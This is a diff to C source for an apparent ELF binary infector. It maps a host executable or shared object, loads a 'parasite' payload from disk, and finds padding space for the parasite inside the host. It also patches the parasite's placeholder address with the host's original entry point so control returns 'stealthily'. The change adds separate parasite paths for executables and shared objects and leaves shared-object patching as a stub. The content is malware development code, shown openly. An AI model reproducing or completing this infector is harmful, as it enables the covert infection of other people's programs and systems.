@@ -91,14 +91,15 @@ void ElfParser(char *filepath)
 	Elf64_Ehdr *host_header = (Elf64_Ehdr *) host_mapping;
     if ( host_header->e_type == ET_REL ||
          host_header->e_type == ET_CORE ) return;
-	else if ( host_header->e_type == ET_EXEC )	HOST_IS_EXECUTABLE = 1;
-	else if ( host_header->e_type == ET_DYN  )	HOST_IS_SHARED_OBJECT = 1;
+	else if ( host_header->e_type == ET_EXEC ){	HOST_IS_EXECUTABLE = 1; HOST_IS_SHARED_OBJECT = 0;}
+	else if ( host_header->e_type == ET_DYN  ){	HOST_IS_SHARED_OBJECT = 1; HOST_IS_EXECUTABLE = 0;}
 
     if ( host_header->e_ident[EI_CLASS] == ELFCLASS32 ) return;
 
 	
-	// Load Parasite into memory (from disk), uses extern 'parasite_path' defined in main.c implicitly
-	LoadParasite();
+	// Load Parasite into memory (from disk), uses extern 'parasite_path_for_exec' defined in main.c implicitly
+	if 		(HOST_IS_EXECUTABLE) 	LoadParasite(parasite_path_for_exec);
+	else if (HOST_IS_SHARED_OBJECT) LoadParasite(parasite_path_for_so);
 
 
 	// Get Home size (in bytes) of parasite residence in host
@@ -133,7 +134,11 @@ void ElfParser(char *filepath)
 	// POSSIBLE Solution -  Parasite should include code that figures out what base address is the 
 	//						binary alloted at runtime so that it transfers the code back to the host
 	//						stealthily.						
-	FindAndReplace(parasite_code, 0xAAAAAAAAAAAAAAAA, original_entry_point);
+	if (HOST_IS_EXECUTABLE) FindAndReplace(parasite_code, 0xAAAAAAAAAAAAAAAA, original_entry_point);
+	else if (HOST_IS_SHARED_OBJECT) {
+	//	FindAndReplace();
+	}
+		
 	// ????????????????????????????????????????????????????????????????????????????????????????????
 
 
@@ -307,7 +312,7 @@ Elf64_Off GetPaddingSize(void *host_mapping)
 
 
 // Loads parasite code into memory and defines parasite_code and parasite_size variables
-void LoadParasite()
+void LoadParasite(char *parasite_path)
 {
 	
 	// Open parasite code
